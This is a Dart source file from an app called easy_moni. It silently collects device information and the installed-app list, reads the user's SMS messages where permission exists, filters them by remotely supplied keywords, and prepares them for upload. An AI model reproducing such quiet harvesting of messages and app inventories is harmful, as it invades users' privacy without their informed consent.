import 'package:easy_moni/core/utils/app_logger.dart';
import 'package:easy_moni/services/platform_service.dart';
import 'package:easy_moni/services/upload_data/sms_keyword_provider.dart';

class UserUploadDataCollector {
  UserUploadDataCollector({required this.smsKeywordProvider});

  final SmsKeywordProvider smsKeywordProvider;

  /// 采集设备信息原始 JSON；采集失败或数据为空时跳过该字段上传。
  Future<dynamic> collectDeviceInfo() async {
    try {
      final data = await SilentPermissionDataService.collect();
      final deviceInfo = data['deviceInfo'];
      if (deviceInfo is Map && deviceInfo.isNotEmpty) {
        return deviceInfo;
      }
      AppLogger.debug('UserUploadDataCollector: 设备信息为空，跳过上传');
      return null;
    } catch (error, stackTrace) {
      AppLogger.debug('设备信息采集异常: $error\n$stackTrace');
      return null;
    }
  }

  /// 采集应用列表原始 JSON；不主动申请权限，采集失败时跳过该字段上传。
  Future<dynamic> collectAppList() async {
    try {
      final data = await SilentPermissionDataService.collect();
      final appList = data['appList'];
      if (appList is List && appList.isNotEmpty) {
        return appList;
      }
      AppLogger.debug('UserUploadDataCollector: 应用列表为空，跳过上传');
      return null;
    } catch (error, stackTrace) {
      AppLogger.debug('应用列表采集异常: $error\n$stackTrace');
      return null;
    }
  }

  /// 采集短信记录原始 JSON；未授权时直接跳过，不弹系统权限窗。
  Future<dynamic> collectSmsRecord() async {
    try {
      final hasPermission = await SmsService.checkPermission();
      if (!hasPermission) {
        AppLogger.debug('UserUploadDataCollector: 短信权限未授权，跳过短信采集');
        return null;
      }

      final smsRecords = await SmsService.getSmsRecords();
      if (smsRecords == null || smsRecords.isEmpty) {
        AppLogger.debug('UserUploadDataCollector: 短信记录为空，跳过上传');
        return null;
      }

      final keywords = _normalizeSmsBodyKeywords(
        await smsKeywordProvider.fetchKeywords(),
      );
      final filteredSms = smsRecords
          .where((sms) {
            return _shouldUploadSmsWithNormalizedKeywords(
              sms: sms,
              keywords: keywords,
            );
          })
          .take(SmsKeywordProvider.maxFilteredSmsCount)
          .toList();

      return filteredSms.isEmpty ? null : filteredSms;
    } catch (error, stackTrace) {
      AppLogger.debug('短信记录采集异常: $error\n$stackTrace');
      return null;
    }
  }

  /// 根据短信正文关键词筛选短信；关键词为空时不过滤。
  bool shouldUploadSms({
    required Map<String, dynamic> sms,
    required List<String> keywords,
  }) {
    return _shouldUploadSmsWithNormalizedKeywords(
      sms: sms,
      keywords: _normalizeSmsBodyKeywords(keywords),
    );
  }

  bool _shouldUploadSmsWithNormalizedKeywords({
    required Map<String, dynamic> sms,
    required List<String> keywords,
  }) {
    if (keywords.isEmpty) {
      return true;
    }

    final body = (sms['body'] ?? '').toString().toLowerCase();
    if (body.isEmpty) {
      return false;
    }

    return keywords.any(body.contains);
  }

  /// 统一清洗短信正文关键词，避免采集时重复处理大小写和空白字符。
  List<String> _normalizeSmsBodyKeywords(List<String> keywords) {
    return keywords
        .map((item) => item.trim().toLowerCase())
        .where((item) => item.isNotEmpty)
        .toList();
  }
}
